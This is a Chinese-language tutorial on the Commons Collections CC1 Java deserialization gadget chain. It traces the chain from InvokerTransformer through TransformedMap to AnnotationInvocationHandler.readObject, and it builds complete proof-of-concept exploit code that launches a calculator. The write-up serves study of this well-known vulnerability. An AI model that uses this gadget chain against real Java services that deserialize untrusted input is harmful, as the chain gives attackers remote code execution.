# 反序列化基础篇-CC1-TransformedMap
## 0x00 前置知识
### writeObject和readObject
Java在序列化一个对象时，将会调用这个对象中的 `writeObject` 方法，参数类型是 `ObjectOutputStream` ，开发者可以将任何内容写入这个 `stream` 中；

反序列化时，会调用 `readObject` ，开发者也可以从中读取出前面写入的内容，并进行处理。

### 如何寻找Gadget?
一条完整的Gadget，应当具备以下成分：
- 入口类
- 链中类
- 危险方法（`Runtime.getRuntime().exec()`)
  - 不同类的同名函数
  - 任意方法调用（反射/动态加载字节码）

入口类条件：
- 可序列化
- 能重写readObject
- 接收任意对象作为参数（集合类型/接收Object）

链中类条件：
- 可序列化
- 接收任意对象作为参数（集合类型/接收Object）

## 0x01 环境搭建
1、maven项目导入依赖

pom.xml导入依赖
```
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
<dependency>
    <groupId>commons-collections</groupId>
    	<artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```
2、JDK版本及sun包源码

 `CC1` 链对 JDK 版本有要求，需在 `8u71` 之前。
`CC1` 链需要用到 `sun` 包中的类，而 `sun` 包在 `jdk` 中的代码是通过 `class` 文件反编译来的，不是 `java` 文件，调试不方便，通过 `find usages` 是搜不到要找的类的，而且其代码中的对象是 `var` 这样的形式，影响代码的阅读。

下载`sun`包，把 `src/share/classes`中的 `sun` 文件夹 放到 `oracle jdk8u66`的`src`文件夹下。
https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4

<div align=center><img width="641" alt="image" src="https://user-images.githubusercontent.com/84888757/204700877-5c68fc27-ba97-4dab-a0cd-01a70d91bdeb.png" /></div>

将`sun`包复制到对应`jdk`的`src`目录下（Macbook时在/Library/Java/JavaVirtualMachines/jdk1.8.0_66.jdk/Contents/Home/Src下）

<img width="1155" alt="image" src="https://user-images.githubusercontent.com/84888757/204702741-0e8acfc6-52ec-4f28-965b-08e3178d7426.png">

然后在 IDEA 中，`File-->Project Structure- ->SDKs` 将 `src` 目录的路径加到 `Sourcepath` 中去：  

<div align=center><img width="894" alt="image" src="https://user-images.githubusercontent.com/84888757/204702840-522354dc-6fc8-4e28-b106-56b240d0908f.png" /></div>

下载maven源码包：

<div align=center><img width="445" alt="image" src="https://user-images.githubusercontent.com/84888757/204703339-9e7d9b3c-e354-489d-8ff2-e5992f3ddc8f.png" /></div>


## 0x02 CC1 TransformedMap Gadget 分析

说到CC1链，大家就得了解`Transformer`接口，它位于 `org.apache.commons.collections` 包中：

<img width="1029" alt="image" src="https://user-images.githubusercontent.com/84888757/204716279-1fb1f5b2-e0ec-4be2-953d-177b39691170.png">

`Transformer` 只有一个 `transform()`方法，`transform` 意为转换，转化，`transformer` 可理解为转换器、修饰器的意思，根据介绍可知道其作用是对传入的对象进行修饰，不改变其类型。来看看有哪些类实现了这个接口：

`command+option`查看实现类

<img width="1032" alt="image" src="https://user-images.githubusercontent.com/84888757/204716382-3b01ade9-17f6-4f51-8e23-24d1d901d1f9.png">

接下来让我们一步一步进行分析，找到一个实现了`Transformer`接口的类，它应当包含一个`transform`危险方法，然后我们再向上去寻找哪里调用了该危险方法。

### 2.1 找到危险方法InvokerTransformer.transform
一般来说，我们正常通过反射执行命令的代码如下：
```
public class CC1Test {
    public static void main(String[] args) throws Exception{
        Runtime r = Runtime.getRuntime();
        Class c = Runtime.class;
        Method execMethod = c.getMethod("exec", String.class);
        execMethod.invoke(r, "/System/Applications/Calculator.app/Contents/MacOS/Calculator");
    }
}
```

我们在`Transformer`接口的实现类中找到`InvokerTransformer`类，查看它的`transform`方法，发现能通过反射执行命令，也就是说，我们已经找到了危险方法，尝试使用它。

![image](https://user-images.githubusercontent.com/84888757/204717213-1fd876e6-f047-4a73-972b-8451590fcc5a.png)

要创建实例前，看一下构造函数，确定需要传入什么参数：

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204717250-4583341b-6a8b-467b-970d-1cf8ca9aad7f.png" /></div>

所以我们将通过反射执行命令的代码改成如下形式：

```
public class CC1Test {
    public static void main(String[] args) throws Exception{
//        Runtime r = Runtime.getRuntime();
//        Class c = Runtime.class;
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r, "/System/Applications/Calculator.app/Contents/MacOS/Calculator");

		InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        exec.transform(Runtime.getRuntime());
    }

}
```

<div align=center><img width="1040" alt="image" src="https://user-images.githubusercontent.com/84888757/204717354-add79c93-4b70-4dea-8962-2983c886cc97.png" /></div>

我们已经找到了危险方法，那么现在应该向前找，谁调用了这个危险方法。

### 2.2 寻找 Gadget
#### 2.2.1 TransformedMap  
右键`Find Usages`，找到`LazyMap`和`TransformedMap`都调用了该危险方法。
`LazyMap`放着下次说，我们先看`TransformedMap`的，这里看到`TransformedMap`有三个方法都调用了危险方法`InvokerTransformer.transform()`:

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204718086-835c8229-cea6-47b8-b9d6-2269e0d19c3e.png" /></div>

我们进入到`TransformedMap.java`中，看看这三个方法在哪里被调用，然后看到`TransformedMap.put`方法总是会调用`TransformedMap.transformKey`和`TransformedMap.transformValue`方法：

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204718466-10e7d30b-150c-4742-8b35-1b41604f6186.png" /></div>

然后根据上面的`find usage`，`TransformedMap.transformKey`和`TransformedMap.transformValue`方法都会调用到`InvokerTransformer.transform()`:

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204718586-9591627c-bcb1-4830-b990-e61cca5659da.png" /></div>

所以现在的思路就是，创建一个`TransformedMap`实例，然后调用一个它的`put`方法，传入`Runtime.getRuntime()`作为`key`或者`value`，然后再接连通过`TransformedMap.transformKey`或者`TransformedMap.transformValue`调用到`InvokerTransformer.transform(Runtime.getRuntime())`执行命令。

既然要创建实例，就要看一下构造方法，然后看到这个构造方法`TransformedMap.TransformedMap`是`protected`的，所以不能直接`new`一个`TransformedMap`实例，只能通过别的方法去调用它：

<div align=center><img width="852" alt="image" src="https://user-images.githubusercontent.com/84888757/204719004-c04ebcb8-10df-40e0-96ce-9a76da0261e2.png" /></div>

找到了一个静态方法`TransformedMap.decorate`调用了构造方法`TransformedMap.TransformedMap`，这里说明创建`TransformedMap`实例时，需要传入三个参数：

- `map`：一个`map`集合。
- `keyTransformer`：用于`key`转换的转换器，`null`表示没有转换。
- `valueTransformer`：用于`value`转换的转换器，`null`表示没有转换。

<div align=center><img width="867" alt="image" src="https://user-images.githubusercontent.com/84888757/204719079-ee476ac5-a279-453d-a0a2-a7fedf4f36a0.png" /></div>

把`key`或者`value`设置为`Runtime.getRuntime()`，调用链如下：
1. `tansformedMap.put(1,Runtime.getRuntime())`
2. `transformValue(Runtime.getRuntime()) `
3. `InvokerTransformer#transform()`

所以我们现在的poc如下：
```
package org.vulhub;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CC1_1 {
    public static void main(String[] args) throws Exception{
        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        exec.transform(Runtime.getRuntime());

        Map map = new HashMap();
        // 调用TransformedMap.decorate实例化TransformedMap
        Map tansformedMap = TransformedMap.decorate(map, exec, null);
//        tansformedMap.put(1,Runtime.getRuntime());
        tansformedMap.put(Runtime.getRuntime(),1);

    }
}
```

<img width="1032" alt="image" src="https://user-images.githubusercontent.com/84888757/204719368-d909d191-ef1c-421e-860a-5b4258b7fbd8.png">

上面那是把`key`赋值为`Runtime.getRuntime()`，由于后面会发现用到`setValue`方法，所以这里应该改成把`value`赋值为`Runtime.getRuntime()`：

```
package org.vulhub;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CC1_1 {
    public static void main(String[] args) throws Exception{
        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        exec.transform(Runtime.getRuntime());

        Map map = new HashMap();
        // 调用TransformedMap.decorate实例化TransformedMap
        Map tansformedMap = TransformedMap.decorate(map, null, exec);
        tansformedMap.put(1,Runtime.getRuntime());
        //tansformedMap.put(Runtime.getRuntime(),1);



    }
}
```
<div align=center><img width="1039" alt="image" src="https://user-images.githubusercontent.com/84888757/204719471-6495525d-14f4-4bd6-91f6-930f09396218.png" /></div>


#### 2.2.2 MapEntry 的 setValue()  

接下来我们就要找哪个类的方法中调用到了 `TransformedMap` 的这三个方法，其中 `transformkey()`和 `transformValue()`只在本类中进行了调用，`checkSetValue()`方法只在抽象类 `AbstractInputCheckedMapDecorator` 的静态内部类 `MapEntry` 的 `setValue()`方法中进行了调用： 

![image](https://user-images.githubusercontent.com/84888757/204720275-5ab73c77-b5b1-4d80-a635-346d1367c852.png)

我们首先发现，`AbstractInputCheckedMapDecorator` 是 `TransformedMap` 的父类，子类 `TransformedMap` 在访问权限允许的情况下，可以直接访问父类`AbstractInputCheckedMapDecorator`的`Field`和方法，包括`setValue`方法，而且子类`TransformedMap`自己也没有重写`setValue`方法，所以遍历`TransformedMap`的`Entry`并调用`setValue`方法，就相当于直接调用到父类`AbstractInputCheckedMapDecorator`中静态类`MapEntry`的`setValue`方法。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204720488-76427863-afdb-4446-9fd5-20f92c3265bf.png" /></div>

不知道大家熟悉 `HashMap` 吗，我们来讲一下 `Map.Entry` 。

我们知道 `Map` 是用来存放键值对的，在`HashMap` 中，一对 `k-v` 是存放在 `HashMap$Node` 中的，而 `Node` 又实现了 `Entry` 接口，所以可以粗略地认为，一个`Entry`就相当于一对 `k-v`。

遍历 `Map` 时,可以通过 `entrySet()`方法获取到所有的`k-v`（`Map.Entry` 类 型）。

比如遍历获取`entry`时，代码如下：
```
for (Map.Entry entry: transformedMap.entrySet()) {
    entry.getValue();
}
```
而`setValue`方法就是重新设置`entry`的`k-v`值，这是`HashMap`中已经存在的方法。

`AbstractInputCheckedMapDecorator`类中的`serValue`方法就是重写的，根据之前一层层的`find Usage`找到的链子，我们只需要遍历被`TransformedMap`修饰过的`map`，再使用 `setValue()`传入 `Runtime.getRuntime()`，就会依次调用到
1. CC1_1 #for循环 #entry.setValue(Runtime.getRuntime())
2. AbstractInputCheckedMapDecorator$MapEntry#setValue(Runtime.getRuntime())
3. TransformedMap#checkSetValue(Runtime.getRuntime())
4. InvokerTransformer#transform(Runtime.getRuntime())

现在poc修改如下：
```
package org.vulhub;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CC1_1 {
    public static void main(String[] args) throws Exception{
        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        exec.transform(Runtime.getRuntime());

        Map map = new HashMap();
        map.put("k", "v");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, exec);
//        Map tansformedMap = TransformedMap.decorate(map, null, exec);
//        tansformedMap.put(1,Runtime.getRuntime());
        //tansformedMap.put(Runtime.getRuntime(),1);

        for (Map.Entry entry: transformedMap.entrySet()) {
            entry.setValue(Runtime.getRuntime());
        }

    }
}
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204721126-c7094830-6e0a-4b3c-8341-77852f501896.png" /></div>

 #### 2.2.3 AnnotationInvocationHandler
再接着找谁调用了这个 `setValue()` 方法，此处找到可能的入口：`AnnotationInvocationHandler.readObject()`，这正好是反序列化必然会用到的`readObject`方法，而且还用到了`for`循环`entry`，很符合我们上一个`demo`，这个`AnnotationInvocationHandler`类在 `sun.reflect.annotation` 包中：  

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204721373-a584b130-c169-4d84-a9e4-730db7ff2512.png" /></div>

我们先看下`AnnotationInvocationHandler`类的构造函数，需要传入一个实现了`Annotation`的`Class`， 以及一个 `Map` 对象  `memberValues`：

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204721451-5f4d6b45-27b4-4efa-a160-653e6c6e0b42.png" /></div>

再来看一下`readObject()`方法。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204721836-2cb95c06-a09d-4a24-99a1-360db6f52f76.png" /></div>


目前存在几个问题：
1. `readObject()`方法中重点看 `for` 循环，首先会对反序列化出来的  `memberValues` 进行遍历，然后会进行一些 `if` 语句的判断，满足条件就会调用`setValue`方法，而 `setValue` 的参数不可控，如何解决？
2. `Runtime` 这个类是不可序列化的（因为它没有实现 `java.io.Serializable`接口），如何对`Runtime`进行序列化和反序列化？（抢答：通过反射）
3. `AnnotationInvocationHandler`这个类不是 `public` 的，构造器也不是 `public` 的，不能直接创建，怎么解决？

我们在最后都会回答这些问题，现在先梳理一下之前的逆向推导过程。  

### 2.3 逆向推导过程总结
首先我们找到了 `Transformer` 接口的实现类 `InvokerTransformer` 作为执行类，它的`transform()`方法是通过**反射**获取我们所传入对象的危险方法，然后进行调用（需`public`访问修饰的方法）,其中的对象、方法名、参数都类型广泛，且都可以由我们控制，也就是说，我们可以调用任意对象的任意方法。

之后我们找到 `TransformedMap` 的`checkSetvalue()`方法，它会调用 `InvokerTransformer#transform()`，而`checkSetvalue()`会在 `AbstractInputCheckedMapDecorator` 的静态内部类 `MapEntry` 的 `setValue()`中被调用， `TransformedMap` 继承自 `AbstractInputCheckedMapDecorator`，所以前面我们通过遍历 `TransformedMap` 得到 `Map.Entry` 再调用 `setValue()`就会调用其父类`AbstractInputCheckedMapDecorator`的静态内部类 `MapEntry` 的 `setValue()`，最后执行命令。

在 `AnnotationInvocationHandler` 的 `readObject()`方法中要满足一定条件，才会调用 `setValue()`方法。  

以上是对逆推找 `Gadget` 的过程总结，描述如下：  

```
InvokerTransformer.transform()
    TransformedMap.checkSetvalue()		   // 会调用valueTransformer.transform(value)
        AbstractInputCheckedMapDecorator           // 静态内部类MapEntry的setValue()实际就是TransformedMap的setValue()
            AnnotationInvocationHandler.readObject()
```

## 0x03 POC 编写
### 3.1 `ChainedTransformer` 和 `ConstantTransformer`
这里再介绍一下`Tansformer`的两个实现类，`ChainedTransformer` 和 `ConstantTransformer`

#### ConstantTransformer
`ConstantTransformer` 是实现了 `Transformer` 接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个对象，并在 `transform` ⽅法将这个对象再返回：

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204723701-a32be79a-64ae-4980-95e3-6a83510b0319.png" /></div>

所以`ConstantTransformer`的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。

#### ChainedTransformer
`ChainedTransformer`也是实现了`Transformer`接⼝的⼀个类，它的作⽤是将内部的多个`Transformer`串在⼀起。

简单来说就是，前⼀个`transform`回调方法返回的结果，作为后⼀个`transform`回调方法的参数传⼊。

`ChainedTransformer`的代码如下：

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204724011-0c27e573-a029-4bf1-8b66-2aa7d0716bce.png" /></div>

那么这样我们可以利用`ChainedTransformer`将`ConstantTransformer`和`InvokerTransformer`的`transform`方法串起来。通过`ConstantTransformer`返回某个类，交给`InvokerTransformer`去调用类中的某个方法。

### 3.2 `AnnotationInvocationHandler` 中 `setValue` 不可控问题
再次回到前面的问题，`setValue` 的参数不是可控的，怎么解决？  

前面的 `Demo` 中我们都是直接指定 `value` 为 `Runtime.getRuntime()`。但实际上 `value` 并不能由我们控制。这时候就要联想到恒定转化器 `ConstantTransformer` 和链式转化器 `ChainedTransformer` 了。

创建一个 `ConstantTransformer` 对象，直接传入 `iConstant` 为 `Runtime.getRuntime()`，放置在 `ChainedTransformer` 的 `iTransformers` 数组的第一个，原先的 `InvokerTransformer` 对象放在第二个，`ChainedTransformer` 传入到 `valueTransformer`。这样不管 `value` 为多少，最终都能执行命令。


`CC1_1.java`代码如下：
```
package org.vulhub;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CC1_1 {
    public static void main(String[] args) throws Exception{
//        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        exec.transform(Runtime.getRuntime());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 创建一个map，并添加一个Entry
        Map map = new HashMap();
        map.put("k", "v");
        
        // 调用TransformedMap.decorate实例化TransformedMap
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, transformerChain);
//        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, exec);
//        Map tansformedMap = TransformedMap.decorate(map, null, exec);
//        tansformedMap.put(1,Runtime.getRuntime());
        //tansformedMap.put(Runtime.getRuntime(),1);

        for (Map.Entry entry: transformedMap.entrySet()) {
            entry.setValue(1234);
        }

    }
}
```

![image](https://user-images.githubusercontent.com/84888757/204724499-2899a1ae-9c93-4d99-9f29-60ea25d4dd51.png)


还有一种更简洁的命令执行方式，就是使用 `TransformedMap` 的 `put` 方法。前面说过 `put()` 最终会调用 `transform` 方法(确切的说只要 `key` 或 `value` 发生变化都会调用这个方法)。

`CC1_1_put.java` 代码如下：
```
package org.vulhub;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CC1_1_put {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc"}),
        };
        
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        Map outerMap = TransformedMap.decorate(innermap, null, transformerChain);

        outerMap.put("test", "1234");
    }
}
```

![image](https://user-images.githubusercontent.com/84888757/204724842-60c6acf2-e9f5-43ef-a1b2-832d3065a8a3.png)



### 3.3 `Runtime` 不可序列化问题  
`Runtime`类并没有实现 `java.io.Serializable`接口，所以它是不可序列化的。

但是我们可以通过**反射**来解决，因为`Class`这个类是可序列化的。
通过反射，获取 `Runtime` 的 `class` 对象，就可将其变成可序列化的。

将 `Runtime.getRuntime().exec()`写成反射形式就是：

```
class<Runtime> runtimeclass = Runtime.class;
Method getRuntime = runtimeclass.getmethod("getRuntime", null);
Runtime r = (Runtime)getRuntime.invoke(null,null);
r.exec("calc");
```

转化为 `Transformers` 就是：  

```
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
    new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc"}),
};
```
 
 到此处我们命令执行的POC代码为：  
```
package org.vulhub;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CC1_1 {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc" }),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put("k", "v");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, transformerChain);


        for (Map.Entry entry: transformedMap.entrySet()) {
            entry.setValue(1234);
        }

    }
}
```

![image](https://user-images.githubusercontent.com/84888757/204725797-a06643c9-f62f-4a98-a465-d694c261936b.png)


### 3.4 `AnnotationInvocationHandler` 的反射调用
`AnnotationInvocationHandler` 类是非`public`的，如何创建其对象呢？
答：反射！
因为 `sun.reflect.annotation.AnnotationInvocationHandler` 是在`JDK`内部的类，不能直接使用`new`来实例化。我们可以使用**反射**获取到它的构造方法，并将其设置成外部可见的，再调用就可以实例化了。 


`AnnotationInvocationHandler` 类的构造函数有两个参数，第一个参数是一个`Annotation`类；第二个是参数就是前面构造的`Map`。  

代码：
```
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
construct.setAccessible(true);
```

### 3.5 `AnnotationInvocationHandler` 进一步分析

![image](https://user-images.githubusercontent.com/84888757/204726609-e180fd10-26bc-46f5-a56d-09c28e6268b0.png)

`AnnotationInvocationHandler`的构造器是要传入一个`Annotation`子类（注解类）的`class`对象`type`，和一个`map`对象`mamberValues`（这里就传入构造好的`TransformedMap`）。

先来看`readObject()`的前半段：

![image](https://user-images.githubusercontent.com/84888757/204727115-d7b70898-5847-4988-873d-26dc88153906.png)

跟进AnnotationType看下：
`sun.reflect.annotation.AnnotationType#getInstance`
> 注释：返回指定注释类型的AnnotationType实例。
如果指定的类对象不代表有效的注释类型，则抛出IllegalArgumentException

![image](https://user-images.githubusercontent.com/84888757/204727328-784cba71-1e4e-4b8d-8384-f2d97bbb6d62.png)


`sun.reflect.annotation.AnnotationType#memberTypes`
> 注释：返回此注释类型的成员类型（成员名称->类型映射）。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/204727416-2e18942a-d111-4d10-96eb-b4a25a57088d.png" /></div>

根据注释结合 `readObject()` 的前半段代码来看，`AnnotationInvocationHandler` 对象在反序列化时会通过 `getInstance` 获取注解的实例来检查反序列化出来的 `type` 是否合法，不合法抛出异常，合法就通过 `memberTypes()`是获取其成员类型（其实就是方法名和返回类型），存储在 `HashMap<String, Class<?>>`中。

重点还是在 `for` 循环：

![image](https://user-images.githubusercontent.com/84888757/204727731-a43b1625-7a31-4c99-9a1b-ba4491dd1b99.png)

遍历反序列化出来的`TranformedMap`，逐个获取键名。

第一个`if`表达的意思是如果该`key`名与注解实例的某个方法名相同，则获取该`key`对应的`value`。

第二个 `if` 表达的意思是若注解实例方法的返回类型不是`key`对应的`value`的实例，或者`key`对应的`value`不是 `ExceptionProxy` 的实例，则修改`key`对应的`value`。

简而言之，要满足以下2个条件：
1. `sun.reflect.annotation.AnnotationInvocationHandler` 构造函数的第一个参数必须是`Annotation`的子类，且其中必须含有至少一个方法，假设方法名是`XXX`。
2. 被 `TransformedMap.decorate` 修饰的`Map`中必须有一个键名为`XXX`的元素。

`Annotation`的实现类有很多：

![image](https://user-images.githubusercontent.com/84888757/204728097-e6eb4ead-cecc-4311-ab7c-34059113fc7b.png)

随便找一个成员不为空的就行，因为`key`是我们可以控制的。

比如， `SuppressWarnings` 中有 `value` 方法：

![image](https://user-images.githubusercontent.com/84888757/204728223-8ddf8d34-5ed9-4e1d-aadb-a699cf77b223.png)

然后将传入的`TransformedMap`的某个`Entry`的`key`值赋值为刚才的方法名`value`即可：

```
map.put("value", "v");
```

最后再加入序列化和反序列化可得完整代码：
`CC1_1.java`
```
package org.vulhub.Ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CC1_1 {
    public static void main(String[] args) throws Exception{
//        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        exec.transform(Runtime.getRuntime());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 创建一个map，并添加一个Entry
        Map map = new HashMap();
        map.put("value", "v");

        // 调用TransformedMap.decorate实例化TransformedMap
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, transformerChain);
//        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, exec);
//        Map tansformedMap = TransformedMap.decorate(map, null, exec);
//        tansformedMap.put(1,Runtime.getRuntime());
        //tansformedMap.put(Runtime.getRuntime(),1);

//        for (Map.Entry entry: transformedMap.entrySet()) {
//            entry.setValue(1234);
//        }

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        Object obj = construct.newInstance(SuppressWarnings.class, transformedMap);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        //oos.close();
        //System.out.println(barr);

        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();

    }
}
```

![image](https://user-images.githubusercontent.com/84888757/204728450-6b84a6df-8827-44ac-81cf-67ad1f9b8070.png)


## 0x04 参考链接
- [Java安全漫谈 - 10.用TransformedMap编写真正的POC](https://t.zsxq.com/ZNZrJMZ)
- [Java安全漫谈 - 11.LazyMap详解](https://t.zsxq.com/FufUf2B)
- [JAVA安全|Gadget篇：TransformedMap CC1链 @walker1995](https://mp.weixin.qq.com/s/1ql85oy2XLD9RljrBpmg8A)
- [Java反序列化CommonsCollections篇(一) CC1链手写EXP @白日梦组长](https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=d97edb6eb916442af659cdbbc179091c)



